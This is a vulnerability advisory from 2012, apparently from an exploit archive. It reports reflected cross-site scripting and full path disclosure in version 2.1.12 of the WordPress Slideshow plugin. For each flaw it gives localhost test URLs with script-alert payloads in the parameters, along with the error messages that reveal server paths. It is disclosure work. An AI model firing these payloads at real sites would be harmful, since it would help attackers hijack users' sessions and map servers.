@@ -1,0 +1,161 @@
+id: 18611
+date: 10/17/2012
+title: WordPress Slideshow 2.1.12 Cross Site Scripting / Path Disclosure  WordPress Slideshow 2.1.12 Cross Site Scripting / Path Disclosure
+author: waraxe
+cves: 
+
+Author: Janek Vind "waraxe"
+Date: 17. October 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-92.html
+
+
+Description of vulnerable target:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Slideshow provides an easy way to integrate a slideshow for any WordPress
+installation.
+
+Any image can be loaded into the slideshow by picking it from the WordPress
+media page, even images you've already uploaded can be inserted into your
+slideshow right away!
+
+http://wordpress.org/extend/plugins/slideshow-jquery-image-gallery/
+
+Affected version: 2.1.12
+
+###############################################################################
+1. Reflected XSS in "views/SlideshowPlugin/slideshow.php"
+###############################################################################
+
+Reasons: 
+ 1. Uninitialized variables "$randomId", "$slides" and "$settings"
+ 2. Improper encoding or escaping of output
+Attack vectors: User-supplied parameters "randomId", "slides" and "settings"
+Preconditions: PHP directive register_globals=on
+
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId="><script>alert(123);</script>
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?slides[0][type]=text&slides[0][title]=<script>alert(123);</script>
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?settings=<body+onload='alert(123)'>
+
+
+###############################################################################
+2. Reflected XSS in "views/SlideshowPluginPostType/settings.php"
+###############################################################################
+
+Reasons: 
+ 1. Uninitialized variables "$settings" and "$inputFields"
+ 2. Improper encoding or escaping of output
+Attack vectors: User-supplied parameters "settings" and "inputFields"
+Preconditions: PHP directive register_globals=on
+
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings[][group]=<script>alert(123);</script>
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings[0][]&inputFields[0]=<script>alert(123);</script>
+
+
+###############################################################################
+3. Reflected XSS in "views/SlideshowPluginPostType/style-settings.php"
+###############################################################################
+
+Reasons: 
+ 1. Uninitialized variables "$settings" and "$inputFields"
+ 2. Improper encoding or escaping of output
+Attack vectors: User-supplied parameters "settings" and "inputFields"
+Preconditions: PHP directive register_globals=on
+
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0][3]=<script>alert(123);</script>
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0]&inputFields[0]=<script>alert(123);</script>
+
+
+###############################################################################
+4. Full Path Disclosure in multiple scripts
+###############################################################################
+
+Reasons: Direct request to php script triggers pathname leak in error message
+Preconditions: PHP directive display_errors=on
+Result: Information Exposure Through an Error Message
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/slideshow.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\slideshow.php on line 34
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/classes/SlideshowPluginWidget.php
+
+Fatal error: Class 'WP_Widget' not found in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\classes\SlideshowPluginWidget.php on line 8
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php
+
+Fatal error: Class 'SlideshowPluginMain' not found in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPlugin\slideshow.php on line 111
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/information.php
+
+Fatal error: Call to undefined function _e() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginPostType\information.php on line 1
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php
+
+Warning: Invalid argument supplied for foreach() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginPostType\settings.php on line 3
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/slides.php
+
+Fatal error: Class 'SlideshowPluginSlideInserter' not found in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginPostType\slides.php on line 3
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php
+
+Warning: Invalid argument supplied for foreach() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginPostType\style-settings.php on line 2
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/support-plugin.php
+
+Fatal error: Call to undefined function _e() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginPostType\support-plugin.php on line 3
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginSlideInserter/insert-image-button.php
+
+Fatal error: Call to undefined function _e() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginSlideInserter\insert-image-button.php on line 1
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginSlideInserter/insert-text-button.php
+
+Fatal error: Call to undefined function _e() in 
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginSlideInserter\insert-text-button.php on line 1
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginSlideInserter/insert-video-button.php
+
+Fatal error: Call to undefined function _e() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginSlideInserter\insert-video-button.php on line 1
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginSlideInserter/search-popup.php
+
+Fatal error: Call to undefined function submit_button() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginSlideInserter\search-popup.php on line 6
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginUpload/upload-button.php
+
+Fatal error: Call to undefined function _e() in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginUpload\upload-button.php on line 1
+
+http://localhost/wp342/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginWidget/form.php
+
+Fatal error: Using $this when not in object context in
+C:\apache_www\wp342\wp-content\plugins\slideshow-jquery-image-gallery\views\SlideshowPluginWidget\form.php on line 2
+
+
+
+#  0day.today [2023-03-23]  #
